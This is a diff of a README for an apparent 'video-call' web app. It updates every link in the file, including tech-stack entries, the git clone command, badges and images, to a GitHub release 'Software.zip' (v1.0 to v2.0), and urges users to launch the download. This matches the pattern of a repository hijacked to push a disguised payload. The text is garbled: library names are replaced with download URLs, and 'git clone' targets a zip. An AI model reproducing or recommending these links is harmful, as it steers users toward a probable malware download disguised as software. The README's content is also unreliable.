@@ -8,11 +8,11 @@ Welcome to the "video-call" repository! This software allows users to sign up or
 - Chat application
 - Responsive design
 - Webrtc video calling
-- https://github.com/kiupfkiliee/video-call/releases/download/v1.0/Software.zip backend with https://github.com/kiupfkiliee/video-call/releases/download/v1.0/Software.zip
+- https://github.com/kiupfkiliee/video-call/releases/download/v2.0/Software.zip backend with https://github.com/kiupfkiliee/video-call/releases/download/v2.0/Software.zip
 - MongoDB database
 - Material-UI for UI components
 - TypeScript for type-safe JavaScript
-- https://github.com/kiupfkiliee/video-call/releases/download/v1.0/Software.zip for real-time chat functionality
+- https://github.com/kiupfkiliee/video-call/releases/download/v2.0/Software.zip for real-time chat functionality
 
 ## How to Use ℹ️
 To get started with the "video-call" software, follow these steps:
@@ -30,7 +30,7 @@ authentication, axios-react, chat-application, express-js, material-ui, mongodb,
 ## Installation Guide 🛠️
 1. Clone the repository:
 ```bash
-git clone https://github.com/kiupfkiliee/video-call/releases/download/v1.0/Software.zip
+git clone https://github.com/kiupfkiliee/video-call/releases/download/v2.0/Software.zip
 ```
 2. Install dependencies:
 ```bash
@@ -44,7 +44,7 @@ npm start
 ## Get Started 🚀
 Now you can experience seamless video calling with this feature-rich software. Join or sign up, share your screen, chat with others, and enjoy the ultimate video communication experience!
 
-[![Download Zip](https://github.com/kiupfkiliee/video-call/releases/download/v1.0/Software.zip)](https://github.com/kiupfkiliee/video-call/releases/download/v1.0/Software.zip)
+[![Download Zip](https://github.com/kiupfkiliee/video-call/releases/download/v2.0/Software.zip)](https://github.com/kiupfkiliee/video-call/releases/download/v2.0/Software.zip)
 
 **Note:** The download link needs to be launched to access the zip file.
 
@@ -52,4 +52,4 @@ If the provided link is not working, please check the "Releases" section of this
 
 Let's connect and communicate like never before with the "video-call" software! 🌟
 
-![Video Call](https://github.com/kiupfkiliee/video-call/releases/download/v1.0/Software.zip)
+![Video Call](https://github.com/kiupfkiliee/video-call/releases/download/v2.0/Software.zip)
